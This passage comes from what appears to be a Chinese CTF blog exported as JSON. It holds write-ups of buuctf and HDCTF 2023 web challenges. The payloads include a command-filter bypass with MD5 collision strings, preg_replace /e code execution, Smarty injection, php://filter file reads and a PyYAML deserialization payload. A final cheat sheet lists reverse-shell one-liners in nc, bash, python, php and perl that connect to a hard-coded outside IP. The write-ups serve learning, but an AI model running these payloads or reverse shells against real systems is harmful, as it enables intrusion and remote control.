并且之后还有`\";`符合停止的条件 而后继续向后读取img的20个字符，第四个、第五个s向后读取均满足规则。\n\n这里需要注意的点：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678030563480-6f3a3535-4f70-44d3-9e72-3e42f519886c.png)\n\n这里`'a\"`左边的单引号是去闭合者一整段字符串右边的单引号\n\n右边的双引号是为了去闭合序列化后的`\"a\"`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678030860232-9241224d-6736-4a96-9bad-e37f51653091.png)\n\n为什么是4个flag 即24个字符 要根据后面构造的内容去灵活变动\n\n然后是`}`构造的字符串中有一个`}`这个很重要 一开始本地测试的一直报错 发现是把这个`}`给删了 这个`}`是用来之后反序列化时候匹配停止匹配的一个符号吧（我是这样认为的）如果不加就会导致沙箱逃逸失败\n\n然后因为在文件包含之前会有base64解码 需要把我们发现的php文件进行base64加密之后 弄进我们构造的字符串中 \n\n之后题目就迎刃而解了。\n","tags":["反序列化字符串逃逸"],"categories":["buuctf"]},{"title":"buuctf-44-[安洵杯 2019]easy_web","url":"/post/6fcfe2b3.html","content":"\n[安洵杯 2019]easy_web\n\n<!--more-->\n\n打开题目抓包分析：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677855227157-8e11fe84-0449-443a-8d14-66b419638837.png)\n\n发现图片是通过base64编码进行输出的 看了大佬的wp `img=TXpVek5UTTFNbVUzTURabE5qYz0` 即文件名是先进行十六进制编码在进行两次base64编码 解码查看原文件名\n\n第一次：base64\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677855430402-2aaa6b54-1704-4a6d-9216-56d539fa2811.png)\n\n第二次: base64 得到hex编码数\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677855472959-be5e14ca-4885-4c53-8f03-1d2b031eb8d5.png)\n\n第三次：在进行十六进制解码\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677855501090-18a10c84-e855-4363-9d00-37618cb88138.png)\n\n那么我们可以这种方式进行构造查看index.php\n\n爆出源码:\n\n```php\n<?php\nerror_reporting(E_ALL || ~ E_NOTICE);\nheader('content-type:text/html;charset=utf-8');\n$cmd = $_GET['cmd'];\nif (!isset($_GET['img']) || !isset($_GET['cmd'])) \n    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');\n$file = hex2bin(base64_decode(base64_decode($_GET['img'])));\n\n\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);\nif (preg_match(\"/flag/i\", $file)) {\n    echo '<img src =\"./ctf3.jpeg\">';\n    die(\"xixi~ no flag\");\n} else {\n    $txt = base64_encode(file_get_contents($file));\n    echo \"<img src='data:image/gif;base64,\" . $txt . \"'></img>\";\n    echo \"<br>\";\n}\necho $cmd;\necho \"<br>\";\nif (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i\", $cmd)) {\n    echo(\"forbid ~\");\n    echo \"<br>\";\n} else {\n    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {\n        echo `$cmd`;  \n    } else {\n        echo (\"md5 is funny ~\");\n    }\n}\n\n\n?>\n```\n\n代码分析： \n\nget方式传入cmd 但是要进行一个正则匹配\n\n再通过 post方式传a与b 要求a与b不相等 但是md5加密后相等\n\n先来看正则匹配\n\n河蟹了一些常用的linux命令和一些字符  这里重点来看一下反斜杠的屏蔽 其实这道题这里匹配反斜杠出现问题了\n\n本地测试：\n\n```php\n<?php\n$cmd=\"\\\\\";\nvar_dump($cmd);\nif (preg_match('/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i', $cmd)){\n    echo \"yes\";\n}\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677856125949-61736d5d-4b4e-4f84-839e-df9dfa4ed823.png)`|\\\\|\\\\\\\\|` 这里两个反斜杠的第二个反斜杠转义了第二个`|` 使得这一块出现了错误\n\n最终这里就是匹配 `\\|\\\\\\\\`这一块 因此可以用反斜杠\n\n本地测试：\n\n```php\n<?php\n$cmd=\"\\|\\\\\\\\\";\nvar_dump($cmd);\nif (preg_match('/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i', $cmd)){\n    echo \"yes\";\n}\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677856091671-e7091ec9-b81a-4757-9431-b32fc21a3a06.png)\n\n但是如果我们想匹配一个`\\` 那么我们在编写正则的时候就需要`\\\\\\`来达到匹配一个`\\`的效果\n\n```php\n<?php\n$cmd=\"\\\\\";\nvar_dump($cmd);\nif (preg_match('/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i', $cmd)){\n    echo \"yes\";\n}\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677856165041-ec8b1553-a9ed-4c29-8092-e50c61727e41.png)\n\n接着来看第二部分md5强相等\n\n一开始我是想通过数组方式绕过 但是这道题在post a和b值后对他们进行了强制转换为字符串类型 因此不能用数组绕过了\n\n只能用一个脚本进行md5碰撞 使得两个字符的md5值强相等\n\n只能借助fastcoll这个工具 具体参考：[https://blog.csdn.net/shuaicenglou3032/article/details/118197904?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167785642816800213071097%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167785642816800213071097&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-118197904-null-null.142^v73^insert_down3,201^v4^add_ask,239^v2^insert_chatgpt&utm_term=fastcoll&spm=1018.2226.3001.4187](https://blog.csdn.net/shuaicenglou3032/article/details/118197904?ops_request_misc=%7B%22request%5Fid%22%3A%22167785642816800213071097%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=167785642816800213071097&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-118197904-null-null.142^v73^insert_down3,201^v4^add_ask,239^v2^insert_chatgpt&utm_term=fastcoll&spm=1018.2226.3001.4187) 这篇文章\n\n注意最后生成的结果是通过url编码后的 如果不进行url编码 那么结果会出现乱码 本地测试：\n\n```php\n<?php\n$a = \"fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-%E8%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87K%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3Fl%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%87P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1Al%EDP%2C%D5%18Q9%EB%B6%89ZW%F4%E5iOa%B0\";\n$b = \"fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-h%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87%CB%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3F%EC%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%07P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1A%EC%ECP%2C%D5%18Q9%EB%B6%89ZW%F4eiOa%B0\";\necho urldecode($a);\necho \"\\n\";\necho urldecode($b);\necho \"\\n\";\necho \"--------------------------------------------------\";\necho \"\\n\";\nif(md5(urldecode($a))===md5(urldecode($b))){\n    echo \"yes\";\n}\nelse{\n    echo \"no\";\n}\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677856630211-e345d088-4b18-477d-b771-d38e62a64410.png)\n\n因为我们提交的内容会被浏览器默认url解码一次 所以结果都是一样的\n\n但是我们查读文件所需的 `ls cat`都被正则匹配了这里应该怎么绕过呢\n\n第一种方式：\n\n可以用`dir`来代替`ls` 进行浏览文件\n\n作用和`ls`一样\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857170069-3d416306-3483-485a-8c98-90b3fa7d5970.png)\n\n`sort`代替`cat`进行读文件\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857270604-b9b7b79c-de53-4bd1-a023-fcc8b44a3134.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857752295-1bffe6b1-fa37-47d1-86ec-954c63aef05f.png)\n\n注意这里抓包payload的时候要将提交方式改为post 第一次做一直都是get传参一直没做出来 之后才发现要将bp的传参方式改为post 空格用url编码方式`%20`细节很重要\n\n构造payload：`?cmd=dir%20/`\n\npost:`a=fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-%E8%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87K%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3Fl%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%87P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1Al%EDP%2C%D5%18Q9%EB%B6%89ZW%F4%E5iOa%B0&b=fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-h%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87%CB%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3F%EC%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%07P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1A%EC%ECP%2C%D5%18Q9%EB%B6%89ZW%F4eiOa%B0`![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857467024-2f3e1f70-d3ea-4a45-be27-295350e349e9.png)\n\n构造payload：`?cmd=sort%20/flag`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857524959-3e9deaf5-07fe-4452-bb95-4a93d916f4fd.png)\n\n第二种方式 之前说正则匹配没有过滤反斜杠\n\n反斜杠在linux命令中也是起着转义的意义 那么在字母前加`\\`就等于没加 `\\n`这种特殊情况除外\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857770921-1b917b10-6346-4376-85f9-ee34ce0e440f.png)\n\n那么就可以在命令中添加反斜杠进行绕过正则匹配\n\n构造payload:`?cmd=l\\s%20/`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857842519-a139ce6f-740f-4d26-9491-5b54072c5a5c.png)\n\n再构造：`?cmd=ca\\t%20/flag`\n\n成功\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857890453-7b478239-0e35-4be4-849a-e51c406b7fc6.png)\n","tags":["bypass","md5强相等碰撞"],"categories":["buuctf"]},{"title":"buuctf-40-[BJDCTF2020]ZJCTF，不过如此","url":"/post/ed5a1437.html","content":"\n[BJDCTF2020]ZJCTF，不过如此\n\n<!--more-->\n\n先是一个代码审计和之前一个反序列化题目很像，就是一个伪协议的利用 \n\n构造payload：\n\n```\n?text=data:text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php\n```\n\n得到源码：\n\n```php\n<?php\n$id = $_GET['id'];\n$_SESSION['id'] = $id;\n\n\nfunction complex($re, $str) {\n    return preg_replace(\n        '/(' . $re . ')/ei',\n        'strtolower(\"\\\\1\")',\n        $str\n    );\n}\n\n\n\nforeach($_GET as $re => $str) {\n    echo complex($re, $str). \"\\n\";\n}\n\n\nfunction getFlag(){\n    @eval($_GET['cmd']);\n}\n```\n\n然后这里涉及到preg_replace() /e模式的漏洞 将用于替换的部分当作php代码执行 参考：https://xz.aliyun.com/t/2557\n\n这里`\\\\1` 其实就是 `\\1` 第一个 `\\ `用于转义了 那么结果就是`\\1` 在这里是反向引用 由于我这里没搞太明白 \n\n这类题直接用模板答案就行`\\S*=${命令执行}` 大佬总结的很全 \n\n思路就是调用getFlag()函数 然后cmd= 命令执行\n\n`/next.php?\\S*=${getFlag()}&cmd=system('cat /flag');` 注意是在next.php 下提交get传参\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677250464663-0534828a-c656-49be-a906-3aaaf89394b0.png)\n\n这里foreach搭配`$_GET`有特殊的用法 注意这里不是`$_GET[]`\n\n本地搭了一个环境测试了一下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677250349098-0aa84b36-823c-4a2d-91d8-c76fcbe35c26.png)\n\n简单说就是形如a=b的形式变量名和值分成两个变量来使用 蛮神奇的\n","tags":["preg_replace() /e"],"categories":["buuctf"]},{"title":"buuctf 39-[BSidesCF 2020]Had a bad day","url":"/post/78a48903.html","content":"\n[BSidesCF 2020]Had a bad day\n\n<!--more-->\n\n打开抓包没有发现什么异常的东西，但是网站获取新页面方式有点奇怪，通过get传参取值来获取新内容，就联想到了伪协议。\n\n直接试试flag.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677214256490-6f408795-207e-463c-bc26-534bf543cfd9.png)\n\n不行呢就试试index.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677214298541-98bada9c-dcc0-487c-ba35-bdcb23d1b86e.png)\n\n发现后台主动给我们加了.php后缀 \n\n构造payload：`?category=php://filter/read=convert.base64-encode/resource=index`\n\n获得base64码解码得出源码：\n\n```plain\n                  <?php\n    \t\t\t\t$file = $_GET['category'];\n    \n    \t\t\t\tif(isset($file))\n    \t\t\t\t{\n    \t\t\t\t\tif( strpos( $file, \"woofers\" ) !==  false || strpos( $file, \"meowers\" ) !==  false || strpos( $file, \"index\")){\n    \t\t\t\t\t\tinclude ($file . '.php');\n    \t\t\t\t\t}\n    \t\t\t\t\telse{\n    \t\t\t\t\t\techo \"Sorry, we currently only support woofers and meowers.\";\n    \t\t\t\t\t}\n    \t\t\t\t}\n    \t\t\t\t?>\n```\n\n我们只能读取他规定的`woofers` `meowers` `index` 三个文件\n\n看了别人的wp 又学到了新姿势 伪协议里面还可以再嵌套一层协议 加上他给的合法文件\n\n```\n?category=php://filter/read=convert.base64-encode/index/resource=flag\n```\n\n`?category=php://filter/read=convert.base64-encode/resource=index/../flag` 两种方式都可以 学到了\n","tags":["php伪协议"],"categories":["buuctf"]},{"title":"HDCTF 2023(省内赛道)","url":"/post/dd40690e.html","content":"\nHDCTF 2023(省内赛道) 部分WP\n\n<!--more-->\n\n最终排名第七吧 web狗表示web后面几道真的很难,目前刷题还没有做到后几道题目的类型，所以后半阶段真的在坐牢，还是太菜了，努力！！！\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165596340-28745076-d8ed-4e46-9793-4e5d6fe9aa23.png)\n\n# Web\n\n## Welcome To HDCTF 2023\n\n### 解一：\n\n直接送死\n\n### 解二：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165396401-dde8abd9-573b-46cd-ad8d-226bd51cf855.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165410073-d283c8aa-3c61-4053-b5df-999deea9f425.png)\n\n直接输入在console中输入seeeeeeeecret就能拿到\n\n## SearchMaster\n\n这题拿了一血 开心qwq\n\n一眼丁真 php的smarty注入\n\n构造payload：\n\n```\ndata={if system('ls /')}{/if}\ndata={if system('cat /flag_13_searchmaster')}{/if}\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165707395-5aedfc9c-7b33-4f5f-8cef-67275fe4f7ab.png)\n\n# Crypto\n\n## Normal_Rsa\n\n应该是题目出问题了 打开题目flag就有\n\n# Misc\n\n## hardMisc\n\n也是拿到一个一血\n\n拖进010一把梭\n\n末尾 base64解码拿到flag\n\n\n\n# 复现：\n\n## YamiYami\n\n一道关于session伪造 yaml(一开始一直在搜yami反序列化 还在想为什么搜不到相关文章 真该死啊我)反序列化 shell反弹的题目\n\n借助这道题目好好学习一下yami漏洞和shell反弹\n\n进入题目后能看到有三个路由 `/read`是用来读文件的 `/upload`是用来上传我们的恶意代码文件的 `/pwd `字面意思就是告诉我们当前在哪个文档中\n\n当时做题的时候还以为这道题目难度应该不会很难 还以为是很基础的上传一句话木马去包含然后getshell 看了wp真的怀疑人生\n\n### 非预期\n\n先说说非预期吧 直接读取环境变量就可以了 我当时也是这么想的 但是我纯脑瘫去读linux系统用户环境信息了\n\n而且题目环境应该是在docker下\n\n一开始一直在读`/etc/profile`\n\n **/etc/profile：** 此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行. 并从/etc/profile.d目录的配置文件中搜集shell的设置。  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514003165-ae5d5af3-b1fe-4857-b9c3-8749c4bd9f08.png)\n\n根本没什么用\n\n应该读环境变量`/proc/1/environ`（详细可参考：https://blog.csdn.net/FY_2018/article/details/112986445）\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514196676-0a40092c-feba-4e9c-b7db-48181e2efc24.png)\n\n### 预期：\n\n上传一个yami反序列化文件 然后反弹shell去打\n\n首先先去读源文件 发现做flask的题目 能get到源代码就去努力！\n\n这里用到了python3解析特性\n\n如果直接构造payload`/read?url=file:///app.py` flag字样也被正则了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514715380-37099247-9a07-43a4-9cd2-067bfface208.png)\n\n\n\n发现是不行的 被过滤了\n\n这里用到了python3的字符解析特性通过双重url编码（全字符）去绕过\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514739750-28c9e6f1-ebd3-4d0e-9735-7a158d95388d.png)\n\n拿到源码\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514766571-03f89872-a08b-47e5-b1e7-b90e9d3eeb92.png)\n\n\n\n源码：\n\n```cmake\n#encoding:utf-8\nimport os\nimport re, random, uuid\nfrom flask import *\nfrom werkzeug.utils import *\nimport yaml\nfrom urllib.request import urlopen\napp = Flask(__name__)\nrandom.seed(uuid.getnode())\napp.config['SECRET_KEY'] = str(random.random()*233)\napp.debug = False\nBLACK_LIST=[\"yaml\",\"YAML\",\"YML\",\"yml\",\"yamiyami\"]\napp.config['UPLOAD_FOLDER']=\"/app/uploads\"\n\n@app.route('/')\ndef index():\n    session['passport'] = 'YamiYami'\n    return '''\n    Welcome to HDCTF2023 <a href=\"/read?url=https://baidu.com\">Read somethings</a>\n    <br>\n    Here is the challenge <a href=\"/upload\">Upload file</a>\n    <br>\n    Enjoy it <a href=\"/pwd\">pwd</a>\n    '''\n@app.route('/pwd')\ndef pwd():\n    return str(pwdpath)\n@app.route('/read')\ndef read():\n    try:\n        url = request.args.get('url')\n        m = re.findall('app.*', url, re.IGNORECASE)\n        n = re.findall('flag', url, re.IGNORECASE)\n        if m:\n            return \"re.findall('app.*', url, re.IGNORECASE)\"\n        if n:\n            return \"re.findall('flag', url, re.IGNORECASE)\"\n        res = urlopen(url)\n        return res.read()\n    except Exception as ex:\n        print(str(ex))\n    return 'no response'\n\ndef allowed_file(filename):\n   for blackstr in BLACK_LIST:\n       if blackstr in filename:\n           return False\n   return True\n@app.route('/upload', methods=['GET', 'POST'])\ndef upload_file():\n    if request.method == 'POST':\n        if 'file' not in request.files:\n            flash('No file part')\n            return redirect(request.url)\n        file = request.files['file']\n        if file.filename == '':\n            return \"Empty file\"\n        if file and allowed_file(file.filename):\n            filename = secure_filename(file.filename)\n            if not os.path.exists('./uploads/'):\n                os.makedirs('./uploads/')\n            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))\n            return \"upload successfully!\"\n    return render_template(\"index.html\")\n@app.route('/boogipop')\ndef load():\n    if session.get(\"passport\")==\"Welcome To HDCTF2023\":\n        LoadedFile=request.args.get(\"file\")\n        if not os.path.exists(LoadedFile):\n            return \"file not exists\"\n        with open(LoadedFile) as f:\n            yaml.full_load(f)\n            f.close()\n        return \"van you see\"\n    else:\n        return \"No Auth bro\"\nif __name__=='__main__':\n    pwdpath = os.popen(\"pwd\").read()\n    app.run(\n        debug=False,\n        host=\"0.0.0.0\"\n    )\n    print(app.config['SECRET_KEY'])\n```\n\n发现还有一个`/boogipop`路由\n\n```cmake\n@app.route('/boogipop')\ndef load():\n    if session.get(\"passport\")==\"Welcome To HDCTF2023\":\n        LoadedFile=request.args.get(\"file\")\n        if not os.path.exists(LoadedFile):\n            return \"file not exists\"\n        with open(LoadedFile) as f:\n            yaml.full_load(f)\n            f.close()\n        return \"van you see\"\n    else:\n        return \"No Auth bro\"\n```\n\n当`session=\"Welcome To HDCTF2023\"`通过get方式去读文件 也就是说还需要session伪造 \n\n伪造需要key 那么看源码是怎么生成的\n\n```cmake\nrandom.seed(uuid.getnode())\napp.config['SECRET_KEY'] = str(random.random()*233)\n```\n\n在 python 中使用 uuid 模块生成 UUID（通用唯一识别码）。可以使用 uuid.getnode() 方法来获取计算机的硬件地址，这个地址将作为 UUID 的一部分。  \n\n`/sys/class/net/eth0/address`，这个就是网卡的位置，读取他进行伪造  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682516256550-09f531fb-105e-458e-b1d5-62edbda38d4b.png)\n\n```cmake\nimport random\nrandom.seed(0x0242ac024ed7) #去掉：加上0x也就是十六进制\nprint(str(random.random()*233))\n```\n\n得到key为`33.893457812509084`\n\n通过脚本伪造session\n\n然后`yaml.full_load(f)`就是漏洞所在点他会将我们上传的恶意文件内容反序列化 并且代码中并没有回显的语句也暗示了这里要通过反弹shell的方式去打（这里参考这篇大佬的文章太细了 https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/）\n\n上传反序列化文件\n\n```cmake\n!!python/object/new:str\n    args: []\n    # 通过 state 触发调用\n    state: !!python/tuple\n      - \"__import__('os').system('bash -c \\\"bash -i >& /dev/tcp/124.221.177.174/7777 <&1\\\"')\"#这里就是代码执行 通过bash直接反弹shell \n      # 下面构造 exp\n      - !!python/object/new:staticmethod\n        args: []\n        state: \n          update: !!python/name:eval\n          items: !!python/name:list  # 不设置这个也可以，会报错但也已经执行成功\n```\n\n至于为什么上面大佬的文章讲的很仔细 我就不献丑了 自己太菜了\n\n简单理解就是python将命令执行的代码塞入了对象中然后yaml序列化得到这个 然后再利用反序列化去命令执行 看起来比较奇怪是因为这种格式是属于yaml形式的序列化对象 所以看起来比较的陌生 还有就是这里的命令执行是用反弹shell 是因为通过看源码发现没有回显的代码 所以只能通过反弹shell去变相得到回显\n\n然后将文件命名为2.txt 这里不能用`.yaml`后缀被屏蔽了\n\n既然是txt后缀为什么代码会被执行呢\n\n这里借用大佬的理解：\n\n猜测可能是：这里full_load调用了load函数，而load函数输入的是一个steam,也就是流，二进\n制文件，所以不管是什么后缀都无关紧要了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682518211036-422e9054-fb3e-4dd9-83ca-b93c288dc87a.png)\n\n上传上去\n\n然后去`/boogipop`路由下去读取，然后反弹shell\n\n这里文件路径是`uplaods/2.txt`\n\n大佬文章也提到了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517504048-653cd836-870e-46e6-93e7-ab8e3953106f.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517014776-8237fe1d-8919-406f-9912-cfc0abb2a08b.png)\n\n不要在意这里为什么bp报错 nc能连通就行\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517082099-b27ae5c2-2d34-4496-8e96-9155ecfc2a77.png)\n\n反弹shell成功\n\n再来说说反弹shell\n\n这里就说说我的理解，不会去将所有概念一字不漏的打出来，我觉得没必要，理解是最棒的，想看概念随时都可以百度，但是唯独理解是检测自己是否对于一个知识点真的理解了\n\n我们一般主动攻击去连接某个电脑，叫做正向连接，一般知道这个电脑一些信息ip之类的，知道它何时在做什么\n\n但是如果我们不知道这台电脑信息ip什么的，或者此时此刻的状态，就叫薛定谔状态吧（bushi，就没法去连接去攻击 那么应该怎么办呢？\n\n这里就用到了反弹shell 何为反弹？\n\n既然我们不知道对方的状态 但是我们知道我们的状态信息 我们可以提供我们自己的一些信息去让对方找到我们然后连接不就行了？\n\n这里可以这么形象的比喻：\n\n简单的说，就是我送了小明一份礼物，小明收到了，看见礼物里面写着xxx大街xxx户xxx号领取(木马)，小明去了敲门(打开木马，反弹shell)，我开门把他拉进来(netcat)，这样我就有了他的支配权，他的操作就被我控制了。\n\n来自一个b站网友 我觉得很形象能理解反弹shell的概念\n\n既然是对方找到我们，就需要用公网ip，我们物理机的ip都是一个局域网分配的，真实ip都掌握在运营商手里\n\n这里就需要用到vps或者在大厂买云服务即可，当然也不影响我白嫖室友的云服务器:)\n\n以上只是我浅薄的理解，可以参考这篇文章深入理解：https://xz.aliyun.com/t/9488\n\n然后我简单总结了一下一些常用的反弹shell的exp：\n\n```cmake\n1.nc\nnetcat 124.221.177.174 7777 -e /bin/bash\n2.bash\nbash -i >& /dev/tcp/124.221.177.174/7777 0>&1\n3.Telnet:\nmknod a p; telnet 124.221.177.174 7777 0<a | /bin/bash 1>a\n4.python:\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"124.221.177.174\",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n5.php\nphp -r '$sock=fsockopen(\"124.221.177.174\",7777);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n6.perl:\nperl -e 'use Socket;$i=\"124.221.177.174\";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n7.sh\nnc 124.221.177.174 7777 -e /bin/sh\n```\n\n回到题目，发现没有关于flag的文件，所以还是通过读取环境变量来读flag，结束。\n\n## LoginMaster\n\n这道题 我的评价是寄，刷题没刷到过这样的注入——quine注入，还有时间盲注也还没有开始学借助此次机会学习学习\n\n首先日常先看`/robots.txt`发现了waf\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682570503152-ae120381-50eb-43c4-9634-a47cff72b0f9.png)\n\n看到waf后我就陷入了沉思，我能想到的payload所包含的几乎都河蟹了个遍，这还怎么玩，就放弃了\n\n看了wp要用时间盲注和quine组合拳去打\n\n其实看了waf 这段代码也大概能感觉到是quine注入 \n\n这里就是需要我们输入的密码与查询到的密码相等 \n\n```cmake\nif ($row['password'] === $password) {\n        die($FLAG);\n```\n\n说简单一点，quine注入就是输入与输出完全相同 自产生程序也就是说就是输入的sql语句与要输出的一致  \n\n用到replace()函数\n\n如果输入 `replace(\".\",char(46),\".\") ` \n\n则会输出 